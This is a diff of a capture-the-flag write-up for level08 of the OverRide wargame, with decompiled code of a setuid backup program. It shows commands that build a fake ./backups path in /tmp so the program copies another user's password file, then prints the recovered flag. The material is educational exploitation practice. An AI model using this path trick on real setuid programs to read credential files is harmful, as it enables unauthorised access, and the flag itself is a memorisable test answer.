@@ -1,22 +1,176 @@
 
-=> The program try to open the first argument prefixed by "./backups/" like "./backups/" + argv[1]
-=> We can't open the flag pass directly because the folders ("...home/user/...") doesn't exist in the home folder
-level08@OverRide:~$ ./level08 /home/users/level09/.pass
-ERROR: Failed to open ./backups//home/users/level09/.pass
+# level08
 
-=> Let's switch to /tmp and create a this folder structure
-mkdir -p ./backups/home/users/level09/
+## General Informations 
 
-=> We execute the program with our new backups struct
-~/level08 /home/users/level09/.pass
+**Path** : `/home/users/level08/level08` </br>
+**File** : 
+```
+level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08`  </br>
+**Protections**:
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   level08
+```
 
-=> It works ! The "./backups//home/users/level09/.pass" is resolved by our folders structure
-cat ./backups/home/users/level09/.pass
+## Static Analysis
+
+After decompiling the binary in ghidra, we get the pseudo code below: 
+
+```
+void log_wrapper(FILE *param_1,char *arg,char *param_3)
+{
+  char cVar1;
+  size_t sVar2;
+  ulong uVar3;
+  ulong uVar4;
+  char *pcVar5;
+  long in_FS_OFFSET;
+  byte bVar6;
+  undefined8 local_120;
+  char local_118 [264];
+  long local_10;
+  
+  bVar6 = 0;
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  local_120 = param_1;
+  strcpy(local_118,arg);
+  uVar3 = 0xffffffffffffffff;
+  pcVar5 = local_118;
+  do {
+    if (uVar3 == 0) break;
+    uVar3 = uVar3 - 1;
+    cVar1 = *pcVar5;
+    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
+  } while (cVar1 != '\0');
+  uVar4 = 0xffffffffffffffff;
+  pcVar5 = local_118;
+  do {
+    if (uVar4 == 0) break;
+    uVar4 = uVar4 - 1;
+    cVar1 = *pcVar5;
+    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
+  } while (cVar1 != '\0');
+  snprintf(local_118 + (~uVar4 - 1),0xfe - (~uVar3 - 1),param_3);
+  sVar2 = strcspn(local_118,"\n");
+  local_118[sVar2] = '\0';
+  fprintf(local_120,"LOG: %s\n",local_118);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+
+undefined8 main(int param_1,undefined8 *arg)
+{
+  char cVar1;
+  int __fd;
+  int iVar2;
+  FILE *log_folder;
+  FILE *__stream;
+  ulong uVar4;
+  char *pcVar5;
+  long in_FS_OFFSET;
+  byte bVar6;
+  char c;
+  char buffer [104];
+  long local_10;
+  
+  bVar6 = 0;
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  c = -1;
+  if (param_1 != 2) {
+    printf("Usage: %s filename\n",*arg);
+  }
+  log_folder = fopen("./backups/.log","w");
+  if (log_folder == (FILE *)0x0) {
+    printf("ERROR: Failed to open %s\n","./backups/.log");
+    exit(1);
+  }
+  log_wrapper(log_folder,"Starting back up: ",arg[1]);
+  __stream = fopen((char *)arg[1],"r");
+  if (__stream == (FILE *)0x0) {
+    printf("ERROR: Failed to open %s\n",arg[1]);
+    exit(1);
+  }
+  builtin_strncpy(buffer,"./backups/",0xb);
+  uVar4 = 0xffffffffffffffff;
+  pcVar5 = buffer;
+  do {
+    if (uVar4 == 0) break;
+    uVar4 = uVar4 - 1;
+    cVar1 = *pcVar5;
+    pcVar5 = pcVar5 + (ulong)bVar6 * -2 + 1;
+  } while (cVar1 != '\0');
+  strncat(buffer,(char *)arg[1],99 - (~uVar4 - 1));
+  __fd = open(buffer,0xc1,0x1b0);
+  if (__fd < 0) {
+    printf("ERROR: Failed to open %s%s\n","./backups/",arg[1]);
+    exit(1);
+  }
+  while( true ) {
+    iVar2 = fgetc(__stream);
+    c = (char)iVar2;
+    if (c == -1) break;
+    write(__fd,&c,1);
+  }
+  log_wrapper(log_folder,"Finished back up ",arg[1]);
+  fclose(__stream);
+  close(__fd);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+    __stack_chk_fail();
+  }
+  return 0;
+}
+```
+
+- `main`s
+    - Opens the log file located in the `./backups/` directory. Otherwise, prints an error message
+    - Opens the file provided as the first argument `argv[1]`. If it fails, an error message is displayed
+    - Tries to open the destination file in the `./backups/` folder using the same path as `argv[1]`. If it doesn’t exist, an error message is displayed
+    - Finally, copies the file from the path specified in `argv[1]` to `./backups/`, preserving the same folder structure `(./backups/path/from/argv[1]/file)`
+
+- `log_wrapper` writes logs to the `./backups/.log` file
 
 
---------------------------------------------------------------------------
+By creating the `./backups/` directory with the same folder structure as `argv[1]`, we should be able to copy the file successfully. </br>
+Since the `/tmp` directory allows us to create folders like .`/backups/...`, we can replicate the path to the pass file and use that as source.
 
+## Vulnerability found  
+
+## Dynamic Analysis
+
+## Payload construction 
+
+We create the `backups` folder in `/tmp` following the structure of the pass file path:
+```
+mkdir -p /tmp/backups/home/users/level09
+```
+
+Running the binary from `/tmp` should trigger the copy of the password file:
+```
 cd /tmp
-mkdir -p ./backups/home/users/level09
 ~/level08 /home/users/level09/.pass
-cat ./backups/home/users/level09/.pass
+ls -la ./backups/home/users/level09/.pass 
+-rw-rw---- 1 level09 users 41 May  6 16:55 ./backups/home/users/level09/.pass
+```
+
+And it worked! The pass file was successfully copied.
+
+## Demonstration 
+
+```
+level08@OverRide:/tmp$ mkdir -p /tmp/backups/home/users/level09
+level08@OverRide:/tmp$ cd /tmp
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass 
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
+## Flag 
+```
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
